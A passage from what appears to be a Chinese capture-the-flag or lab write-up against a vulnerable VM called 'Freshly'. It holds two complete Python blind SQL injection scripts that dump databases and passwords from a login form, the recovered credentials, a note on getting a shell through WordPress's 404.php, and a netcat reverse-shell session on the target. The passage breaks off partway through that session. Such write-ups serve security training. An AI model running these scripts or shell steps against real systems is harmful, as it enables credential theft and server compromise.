class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br>        low = <span class="hljs-number">32</span><br>        high = <span class="hljs-number">128</span><br>        mid = (low+high)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>           <span class="hljs-comment"># url = host + &quot;?id=1&#x27;^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&lt;%d)^1-- -&quot; % (i,mid)</span><br>            <span class="hljs-comment">#res = requests.get(url)</span><br>            payload= <span class="hljs-string">&quot;1&#x27; or (ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&lt;%d) # &quot;</span> % (i,mid)<br>            param =&#123;<span class="hljs-string">&quot;user&quot;</span>:payload,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;s&quot;</span>:<span class="hljs-string">&quot;Submit&quot;</span>&#125;<br>            res = requests.post(host,data=param)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;1&quot;</span> <span class="hljs-keyword">in</span> res.text:<br>                high = mid<br>            <span class="hljs-keyword">else</span>:<br>                low = mid+<span class="hljs-number">1</span><br>            mid=(low+high)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">if</span> mid &lt;= <span class="hljs-number">32</span> <span class="hljs-keyword">or</span> mid &gt;= <span class="hljs-number">127</span>:<br>            <span class="hljs-keyword">break</span><br>        ans += <span class="hljs-built_in">chr</span>(mid-<span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;table is -&gt; &quot;</span>+ans)<br>    <span class="hljs-keyword">return</span> ans<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getColumn</span>(<span class="hljs-params">table_name</span>): <span class="hljs-comment">#获取列名</span><br>    <span class="hljs-keyword">global</span> host<br>    ans=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br>        low = <span class="hljs-number">32</span><br>        high = <span class="hljs-number">128</span><br>        mid = (low+high)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>            <span class="hljs-comment">#url = host + &quot;id=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;Flaaaaag&#x27;)),%d,1))&lt;%d)^1&quot; % (i,mid)</span><br>            <span class="hljs-comment">#res = requests.get(url)</span><br>            payload= <span class="hljs-string">&quot;1&#x27; or (ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;%s&#x27;)),%d,1))&lt;%d) #&quot;</span> % (table_name,i,mid)<br>            <span class="hljs-comment">#print (payload)</span><br>            param =&#123;<span class="hljs-string">&quot;user&quot;</span>:payload,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;s&quot;</span>:<span class="hljs-string">&quot;Submit&quot;</span>&#125;<br>            res = requests.post(host,data=param)<br>            <span class="hljs-comment">#print (res.text)</span><br>            <br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;1&quot;</span> <span class="hljs-keyword">in</span> res.text:<br>                high = mid<br>            <span class="hljs-keyword">else</span>:<br>                low = mid+<span class="hljs-number">1</span><br>            mid=(low+high)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">if</span> mid &lt;= <span class="hljs-number">32</span> <span class="hljs-keyword">or</span> mid &gt;= <span class="hljs-number">127</span>:<br>            <span class="hljs-keyword">break</span><br>        ans += <span class="hljs-built_in">chr</span>(mid-<span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;column is -&gt; &quot;</span>+ans)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dumpTable</span>(<span class="hljs-params">table_name,column_name</span>):<span class="hljs-comment">#脱裤</span><br>    <span class="hljs-keyword">global</span> host<br>    ans=<span class="hljs-string">&#x27;&#x27;</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10000</span>):<br>        low = <span class="hljs-number">32</span><br>        high = <span class="hljs-number">128</span><br>        mid = (low+high)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br><br>            payload= <span class="hljs-string">&quot;1&#x27; or (ascii(substr((select(group_concat(%s))from(%s)),%d,1))&lt;%d) #&quot;</span> % (column_name,table_name,i,mid)<br><br>            param =&#123;<span class="hljs-string">&quot;user&quot;</span>:payload,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;s&quot;</span>:<span class="hljs-string">&quot;Submit&quot;</span>&#125;<br><br>            res = requests.post(host,data=param)<br>            <span class="hljs-comment">#print(res.text)</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;1&quot;</span> <span class="hljs-keyword">in</span> res.text:<br>                high = mid<br>            <span class="hljs-keyword">else</span>:<br>                low = mid+<span class="hljs-number">1</span><br>            mid=(low+high)//<span class="hljs-number">2</span><br>            <span class="hljs-comment">#print(mid)</span><br>        <span class="hljs-keyword">if</span> mid &lt;= <span class="hljs-number">32</span> <span class="hljs-keyword">or</span> mid &gt;= <span class="hljs-number">127</span>:<br>            <span class="hljs-keyword">break</span><br>        ans += <span class="hljs-built_in">chr</span>(mid-<span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;dumpTable is -&gt; &quot;</span>+ans)<br><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br><br>    user_input = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;1: getTable, 2: getColumn, 3: dumpTable. \nplease input the number of what you what:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(user_input)<br>    <span class="hljs-keyword">if</span> user_input ==<span class="hljs-string">&quot;1&quot;</span>:<br>        tables_name = getTable()<br>        continue_getdata = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\nDo you want to continue getting columns ?(please input y or n)\n&quot;</span>)<br>        <span class="hljs-keyword">if</span> continue_getdata ==<span class="hljs-string">&quot;y&quot;</span>:<br>            table_name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please input the name of table that you want to get:&quot;</span>)<br>            getColumn(table_name)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span><br><br>        continue_getdata = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\nDo you want to continue getting columns ?(please input y or n)\n&quot;</span>)<br><br>        <span class="hljs-keyword">if</span> continue_getdata ==<span class="hljs-string">&quot;y&quot;</span>:<br>            column_name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please input the columns of table that you want to get(use &#x27;,&#x27; to join different columns):&quot;</span>)<br>            dumpTable(table_name,column_name)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span><br><br><br>    <span class="hljs-keyword">elif</span> user_input==<span class="hljs-string">&quot;2&quot;</span>:<br>        table_name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please input the name of table that you want to get columns:&quot;</span>)<br>        getColumn(table_name)<br><br>        continue_getdata = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\nDo you want to continue getting columns ?(please input y or n)\n&quot;</span>)<br><br>        <span class="hljs-keyword">if</span> continue_getdata ==<span class="hljs-string">&quot;y&quot;</span>:<br>            column_name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please input the columns of table that you want to get(use &#x27;,&#x27; to join different columns):&quot;</span>)<br><br>            dumpTable(table_name,column_name)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span><br><br>    <span class="hljs-keyword">elif</span> user_input==<span class="hljs-string">&quot;3&quot;</span>:<br>        table_name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please input the name of table:&quot;</span>)<br>        column_name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please input the columns of table (use &#x27;,&#x27; to join different columns):&quot;</span>)<br>        dumpTable(table_name,column_name)<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;check your input&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:  <br>    main()<br></code></pre></td></tr></table></figure><p>虽然拿到了数据，但是在这里卡了很久，因为习惯了直接对当前数据库进行注入，这次甚至没遍历有哪些数据库，偷懒+惯性思维导致的信息收集不完全。改进后的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#-*-coding:utf-8-*-</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>host = <span class="hljs-string">&quot;http://192.168.56.136/login.php&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getDatabase</span>():  <span class="hljs-comment">#获取数据库名</span><br>    <span class="hljs-keyword">global</span> host<br>    ans=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br>        low = <span class="hljs-number">32</span><br>        high = <span class="hljs-number">128</span><br>        mid = (low+high)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>            <span class="hljs-comment">#url= host +&quot;?id=1&#x27;^(ascii(substr((select(database())),%d,1))&lt;%d)^1-- -&quot; % (i,mid)</span><br>            <span class="hljs-comment">#res = requests.get(url)</span><br>            payload= <span class="hljs-string">&quot;1&#x27; or (ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&lt;%d) # &quot;</span> % (i,mid)<br>            param =&#123;<span class="hljs-string">&quot;user&quot;</span>:payload,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;s&quot;</span>:<span class="hljs-string">&quot;Submit&quot;</span>&#125;<br>            res = requests.post(host,data=param)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;1&quot;</span> <span class="hljs-keyword">in</span> res.text:<br>                high = mid<br>            <span class="hljs-keyword">else</span>:<br>                low = mid+<span class="hljs-number">1</span><br>            mid=(low+high)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">if</span> mid &lt;= <span class="hljs-number">32</span> <span class="hljs-keyword">or</span> mid &gt;= <span class="hljs-number">127</span>:<br>            <span class="hljs-keyword">break</span><br>        ans += <span class="hljs-built_in">chr</span>(mid-<span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;database is -&gt; &quot;</span>+ans)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getTable</span>(<span class="hljs-params">database_name</span>): <span class="hljs-comment">#获取表名</span><br>    <span class="hljs-keyword">global</span> host<br>    ans=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br>        low = <span class="hljs-number">32</span><br>        high = <span class="hljs-number">128</span><br>        mid = (low+high)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>           <span class="hljs-comment"># url = host + &quot;?id=1&#x27;^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&lt;%d)^1-- -&quot; % (i,mid)</span><br>            <span class="hljs-comment">#res = requests.get(url)</span><br>            payload= <span class="hljs-string">&quot;1&#x27; or (ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;%s&#x27;)),%d,1))&lt;%d) # &quot;</span> % (database_name,i,mid)<br>            <br>            <span class="hljs-comment">#payload= &quot;1&#x27; or (ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&lt;%d) # &quot; % (i,mid)</span><br>            param =&#123;<span class="hljs-string">&quot;user&quot;</span>:payload,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;s&quot;</span>:<span class="hljs-string">&quot;Submit&quot;</span>&#125;<br>            res = requests.post(host,data=param)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;1&quot;</span> <span class="hljs-keyword">in</span> res.text:<br>                high = mid<br>            <span class="hljs-keyword">else</span>:<br>                low = mid+<span class="hljs-number">1</span><br>            mid=(low+high)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">if</span> mid &lt;= <span class="hljs-number">32</span> <span class="hljs-keyword">or</span> mid &gt;= <span class="hljs-number">127</span>:<br>            <span class="hljs-keyword">break</span><br>        ans += <span class="hljs-built_in">chr</span>(mid-<span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;table is -&gt; &quot;</span>+ans)<br>    <span class="hljs-keyword">return</span> ans<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getColumn</span>(<span class="hljs-params">database_name,table_name</span>): <span class="hljs-comment">#获取列名</span><br>    <span class="hljs-keyword">global</span> host<br>    ans=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br>        low = <span class="hljs-number">32</span><br>        high = <span class="hljs-number">128</span><br>        mid = (low+high)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>            <span class="hljs-comment">#url = host + &quot;id=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;Flaaaaag&#x27;)),%d,1))&lt;%d)^1&quot; % (i,mid)</span><br>            <span class="hljs-comment">#res = requests.get(url)</span><br>            payload= <span class="hljs-string">&quot;1&#x27; or (ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;%s&#x27; and table_schema = &#x27;%s&#x27;)),%d,1))&lt;%d) #&quot;</span> % (table_name,database_name,i,mid)<br>            <span class="hljs-comment">#print (payload)</span><br>            param =&#123;<span class="hljs-string">&quot;user&quot;</span>:payload,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;s&quot;</span>:<span class="hljs-string">&quot;Submit&quot;</span>&#125;<br>            res = requests.post(host,data=param)<br>            <span class="hljs-comment">#print (res.text)</span><br>            <br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;1&quot;</span> <span class="hljs-keyword">in</span> res.text:<br>                high = mid<br>            <span class="hljs-keyword">else</span>:<br>                low = mid+<span class="hljs-number">1</span><br>            mid=(low+high)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">if</span> mid &lt;= <span class="hljs-number">32</span> <span class="hljs-keyword">or</span> mid &gt;= <span class="hljs-number">127</span>:<br>            <span class="hljs-keyword">break</span><br>        ans += <span class="hljs-built_in">chr</span>(mid-<span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;column is -&gt; &quot;</span>+ans)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dumpTable</span>(<span class="hljs-params">database_name,table_name,column_name</span>):<span class="hljs-comment">#脱裤</span><br>    <span class="hljs-keyword">global</span> host<br>    ans=<span class="hljs-string">&#x27;&#x27;</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10000</span>):<br>        low = <span class="hljs-number">32</span><br>        high = <span class="hljs-number">128</span><br>        mid = (low+high)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br><br>            payload= <span class="hljs-string">&quot;1&#x27; or (ascii(substr((select(group_concat(%s))from(%s.%s)),%d,1))&lt;%d) #&quot;</span> % (column_name,database_name,table_name,i,mid)<br><br>            param =&#123;<span class="hljs-string">&quot;user&quot;</span>:payload,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;s&quot;</span>:<span class="hljs-string">&quot;Submit&quot;</span>&#125;<br><br>            res = requests.post(host,data=param)<br>            <span class="hljs-comment">#print(res.text)</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;1&quot;</span> <span class="hljs-keyword">in</span> res.text:<br>                high = mid<br>            <span class="hljs-keyword">else</span>:<br>                low = mid+<span class="hljs-number">1</span><br>            mid=(low+high)//<span class="hljs-number">2</span><br>            <span class="hljs-comment">#print(mid)</span><br>        <span class="hljs-keyword">if</span> mid &lt;= <span class="hljs-number">32</span> <span class="hljs-keyword">or</span> mid &gt;= <span class="hljs-number">127</span>:<br>            <span class="hljs-keyword">break</span><br>        ans += <span class="hljs-built_in">chr</span>(mid-<span class="hljs-number">1</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;dumpTable is -&gt; &quot;</span>+ans)<br><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br><br>    user_input = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;0:getDatabase, 1: getTable, 2: getColumn, 3: dumpTable. \nplease input the number of what you what:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(user_input)<br>    <span class="hljs-keyword">if</span> user_input == <span class="hljs-string">&quot;0&quot;</span>:<br>    getDatabase()<br>    <span class="hljs-keyword">elif</span> user_input ==<span class="hljs-string">&quot;1&quot;</span>:<br>        database_name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please input the name of database that you want to get:&quot;</span>)<br>        tables_name = getTable(database_name)<br>        continue_getdata = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\nDo you want to continue getting columns ?(please input y or n)\n&quot;</span>)<br>        <span class="hljs-keyword">if</span> continue_getdata ==<span class="hljs-string">&quot;y&quot;</span>:<br>            table_name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please input the name of table that you want to get:&quot;</span>)<br>            getColumn(database_name,table_name)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span><br><br>        continue_getdata = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\nDo you want to continue getting data ?(please input y or n)\n&quot;</span>)<br><br>        <span class="hljs-keyword">if</span> continue_getdata ==<span class="hljs-string">&quot;y&quot;</span>:<br>            column_name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please input the columns of table that you want to get(use &#x27;,&#x27; to join different columns):&quot;</span>)<br>            dumpTable(database_name,table_name,column_name)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span><br><br><br>    <span class="hljs-keyword">elif</span> user_input==<span class="hljs-string">&quot;2&quot;</span>:<br>        database_name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please input the name of database that you want to get:&quot;</span>)<br>        table_name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please input the name of table that you want to get columns:&quot;</span>)<br>        getColumn(database_name,table_name)<br><br>        continue_getdata = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\nDo you want to continue getting data ?(please input y or n)\n&quot;</span>)<br><br>        <span class="hljs-keyword">if</span> continue_getdata ==<span class="hljs-string">&quot;y&quot;</span>:<br>            column_name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please input the columns of table that you want to get(use &#x27;,&#x27; to join different columns):&quot;</span>)<br><br>            dumpTable(database_name,table_name,column_name)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span><br><br>    <span class="hljs-keyword">elif</span> user_input==<span class="hljs-string">&quot;3&quot;</span>:<br>        database_name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please input the name of database that you want to get:&quot;</span>)<br>        table_name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please input the name of table:&quot;</span>)<br>        column_name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please input the columns of table (use &#x27;,&#x27; to join different columns):&quot;</span>)<br>        dumpTable(database_name,table_name,column_name)<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;check your input&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:  <br>    main()<br></code></pre></td></tr></table></figure><p>运行上述脚本即可，修改此脚本的关键点在于修改 payload 变量。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">database</span> <span class="hljs-keyword">is</span> -&gt;</span> information_schema,login,mysql,performance_schema,phpmyadmin,users,wordpress8080<br><br># wordpress8080数据库的结果<br><span class="hljs-function"><span class="hljs-title">table</span> <span class="hljs-keyword">is</span> -&gt;</span> users<br><br><span class="hljs-function"><span class="hljs-title">column</span> <span class="hljs-keyword">is</span> -&gt;</span> username,password<br><br><span class="hljs-function"><span class="hljs-title">dumpTable</span> <span class="hljs-keyword">is</span> -&gt;</span> adminSuperSecretPassword<br><br># login数据库的结果<br><span class="hljs-function"><span class="hljs-title">table</span> <span class="hljs-keyword">is</span> -&gt;</span> user_name,users<br><br><span class="hljs-function"><span class="hljs-title">column</span> <span class="hljs-keyword">is</span> -&gt;</span> user_name,password<br><br><span class="hljs-function"><span class="hljs-title">dumpTable</span> <span class="hljs-keyword">is</span> -&gt;</span> candyshoppassword,SirPopRocks<br></code></pre></td></tr></table></figure><p>尝试使用上述用户名密码登录 wordpress 后台</p><h2 id="后台-getshell"><a href="#后台-getshell" class="headerlink" title="后台 getshell"></a>后台 getshell</h2><p>经典编辑 404.php getshell</p><p><img src="/pic/b9c402f08514add83c17a971be214c16_MD5.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/freshly]<br>└─$ sudo nc -lvnp 443                                   <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [192.168.56.106] from (UNKNOWN) [192.168.56.136] 54506<br>Linux Freshly 3.13.0-45-generic <span class="hljs-comment">#74-Ubuntu SMP Tue Jan 13 19:37:48 UTC 2015 i686 athlon i686 GNU/Linux</span><br> 06:52:53 up  2:29,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.01, 1.42<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=1(daemon) gid=1(daemon) <span class="hljs-built_in">groups</span>=1(daemon)<br>/bin/sh: 0: can\<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ whoami</span><br><span class="hljs-string">daemon</span><br><span class="hljs-string">$ id</span><br><span class="hljs-string">uid=1(daemon) gid=1(daemon) groups=1(daemon)</span><br><span class="hljs-string">$ which python</span><br><span class="hljs-string">/usr/bin/python</span><br><span class="hljs-string">$ uname -a</span><br><span class="hljs-string">Linux Freshly 3.13.0-45-generic #74-Ubuntu SMP Tue Jan 13 19:37:48 UTC 2015 i686 athlon i686 GNU/Linux</span><br><span class="hljs-string">$ ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default </span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    